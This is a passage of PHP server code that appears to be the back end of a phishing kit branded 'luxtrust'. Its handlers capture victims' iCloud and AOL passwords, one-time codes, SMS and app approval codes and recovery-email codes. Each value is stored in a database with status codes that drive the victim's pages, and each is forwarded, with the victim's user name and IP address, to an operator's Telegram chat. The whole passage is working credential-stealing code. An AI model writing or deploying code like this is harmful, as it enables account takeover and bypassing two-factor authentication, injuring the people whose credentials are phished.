        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Live RecMail:</b> <code>$lmail</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}



if ($_GET['type'] == 'lmailc') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['lmailc'])) {
        $lmailc = mysqli_real_escape_string($conn, $_POST['lmailc']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=465, buzzed=0, lmailc='$lmailc' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Live RecMail Code:</b> <code>$lmailc</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}


if ($_GET['type'] == 'lmailcerror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['lmailc'])) {
        $lmailc = mysqli_real_escape_string($conn, $_POST['lmailc']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=467, buzzed=0, lmailc='$lmailc' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "📲 <b>Live RecMail Code Err:</b> <code>$lmailc</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'SMS code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}



//ICloud action


if ($_GET['type'] == 'icstart') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['icstart'])) {
        $icstart = mysqli_real_escape_string($conn, $_POST['icstart']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=501, buzzed=1, icstart='$icstart' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>ICloud verication:</b> <code>$icstart</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	

if ($_GET['type'] == 'icpss') {
    $uniqueid = $_SESSION['uniqueid'];

	$date = date("Y-m-d h:i a", time());

    if (!empty($_POST['icpss'])) {
        $icpss = mysqli_real_escape_string($conn, $_POST['icpss']);

        $query = mysqli_query($conn, "UPDATE clients SET status=503, buzzed=0, icpss='$icpss' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
    // Query database for user information
    $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
    $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

    // Format the Telegram message with emojis and clean layout
    $tmsg = "
<strong> luxtrust </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
📧 <strong>Email/User:</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔑 <strong>Icloud Password:</strong> <code>$icpss</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date $time</code>\n
";

    // Clean up any unnecessary line breaks
    $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

    // Send the message to Telegram
    $telegram = new Telegram($bot_token);
    $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
    $telegram->sendMessage($content);
}

    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}


if ($_GET['type'] == 'icpsserror') {
    $uniqueid = $_SESSION['uniqueid'];

	$date = date("Y-m-d h:i a", time());

    if (!empty($_POST['icpss'])) {
        $icpss = mysqli_real_escape_string($conn, $_POST['icpss']);

        $query = mysqli_query($conn, "UPDATE clients SET status=505, buzzed=0, icpss='$icpss' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
    // Query database for user information
    $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
    $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

    // Format the Telegram message with emojis and clean layout
    $tmsg = "
<strong> luxtrust </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
📧 <strong>Email/User:</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔑 <strong>Icloud Password Err:</strong> <code>$icpss</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date $time</code>\n
";

    // Clean up any unnecessary line breaks
    $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

    // Send the message to Telegram
    $telegram = new Telegram($bot_token);
    $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
    $telegram->sendMessage($content);
}

    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}


if ($_GET['type'] == 'ic2fa') {
    $uniqueid = $_SESSION['uniqueid'];
	
	
	$date = date("Y-m-d h:i a", time());

    if (!empty($_POST['ic2fa'])) {
        $ic2fa = mysqli_real_escape_string($conn, $_POST['ic2fa']);

        $query = mysqli_query($conn, "UPDATE clients SET status=507, buzzed=0, ic2fa='$ic2fa' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
    // Query database for user information
    $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
    $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

    // Format the Telegram message with emojis and clean layout
    $tmsg = "
<strong> luxtrust </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
📧 <strong>Email/User:</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔑 <strong>Icloud OTP:</strong> <code>$ic2fa</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date $time</code>\n
";

    // Clean up any unnecessary line breaks
    $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

    // Send the message to Telegram
    $telegram = new Telegram($bot_token);
    $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
    $telegram->sendMessage($content);
}

    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}


if ($_GET['type'] == 'ic2faerror') {
    $uniqueid = $_SESSION['uniqueid'];
	
	
	$date = date("Y-m-d h:i a", time());

    if (!empty($_POST['ic2fa'])) {
        $ic2fa = mysqli_real_escape_string($conn, $_POST['ic2fa']);

        $query = mysqli_query($conn, "UPDATE clients SET status=509, buzzed=0, ic2fa='$ic2fa' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
    // Query database for user information
    $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
    $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

    // Format the Telegram message with emojis and clean layout
    $tmsg = "
<strong> luxtrust </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
📧 <strong>Email/User:</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔑 <strong>Icloud OTP Err:</strong> <code>$ic2fa</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date $time</code>\n
";

    // Clean up any unnecessary line breaks
    $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

    // Send the message to Telegram
    $telegram = new Telegram($bot_token);
    $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
    $telegram->sendMessage($content);
}

    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}

//Aol action



if ($_GET['type'] == 'alstart') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['alstart'])) {
        $alstart = mysqli_real_escape_string($conn, $_POST['alstart']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=401, buzzed=1, alstart='$alstart' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>Aol verication:</b> <code>$alstart</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	

if ($_GET['type'] == 'alpass') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['alpass'])) {
        $alpass = mysqli_real_escape_string($conn, $_POST['alpass']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=403, buzzed=0, alpass='$alpass' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>AOL Password:</b> <code>$alpass</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	



if ($_GET['type'] == 'alpasserror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['alpass'])) {
        $alpass = mysqli_real_escape_string($conn, $_POST['alpass']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=405, buzzed=0, alpass='$alpass' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>AOL Password Err:</b> <code>$alpass</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	




if ($_GET['type'] == 'aldigt2') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['aldigt2'])) {
        $aldigt2 = mysqli_real_escape_string($conn, $_POST['aldigt2']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=407, buzzed=0, aldigt2='$aldigt2' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>AOL 2 Digt:</b> <code>$aldigt2</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	



if ($_GET['type'] == 'alsms') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['alsms'])) {
        $alsms = mysqli_real_escape_string($conn, $_POST['alsms']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=409, buzzed=0, alsms='$alsms' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>AOL SMS:</b> <code>$alsms</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'alsmserror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['alsms'])) {
        $alsms = mysqli_real_escape_string($conn, $_POST['alsms']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=411, buzzed=0, alsms='$alsms' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>AOL SMS Err:</b> <code>$alsms</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}


if ($_GET['type'] == 'alapp') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['alapp'])) {
        $alapp = mysqli_real_escape_string($conn, $_POST['alapp']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=413, buzzed=0, alapp='$alapp' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>AOL APP:</b> <code>$alapp</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	


if ($_GET['type'] == 'alapperror') {
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['alapp'])) {
        $alapp = mysqli_real_escape_string($conn, $_POST['alapp']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET status=415, buzzed=0, alapp='$alapp' WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b> luxtrust</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "📧 <b>Email/User:</b> <code>{$array['user']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
			$tmsg .= "🔒 <b>AOL APP Err:</b> <code>$alapp</code>\n";
			$tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }

    } else {
        $response = array('status' => 'notok', 'message' => 'Email code is empty');
    }

    // Ensure content type is JSON and that a valid response is returned
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}	







if ($_GET['type'] == 'change2fa') {
    $uniqueid = $_SESSION['uniqueid'];


	$date = date("Y-m-d h:i a", time());
    if (!empty($_POST['change2fa'])) {
        $change2fa = mysqli_real_escape_string($conn, $_POST['change2fa']);

        $query = mysqli_query($conn, "UPDATE clients SET status=118, buzzed=0, change2fa='$change2fa' WHERE uniqueid='$uniqueid'");
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
    // Query database for user information
    $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
    $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

    // Format the Telegram message
    $tmsg = "
<strong> luxtrust </strong>\n
<code>━━━━━━━━━━━━━━━</code>\n
👤 <strong>Email/User::</strong> <code>{$array['user']}</code>\n
<code>━━━━━━━━━━━━━━━</code>\n
🔑 <strong>Request Change 2fa:</strong> <code>$change2fa</code>\n
<code>━━━━━━━━━━━━━━━</code>\n\n
🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n
📅 <strong>Date:</strong> <code>$date $time</code>\n
";

    // Clean up any unnecessary line breaks
    $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

    // Send the message to Telegram
    $telegram = new Telegram($bot_token);
    $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
    $telegram->sendMessage($content);
}

    } else {
        $response = array('status' => 'notok', 'message' => 'Password is empty');
    }

    echo json_encode($response);
}



if ($_GET['type'] == 'resendtap') {
    $uniqueid = $_SESSION['uniqueid'];


	$date = date("Y-m-d h:i a", time());
    if (!empty($_POST['resendtap'])) {
        $resendtap = mysqli_real_escape_string($conn, $_POST['resendtap']);

        $query = mysqli_query($conn, "UPDATE clients SET status=373, buzzed=0, resendtap='$resendtap' WHERE uniqueid='$uniqueid'");
        if ($query) {
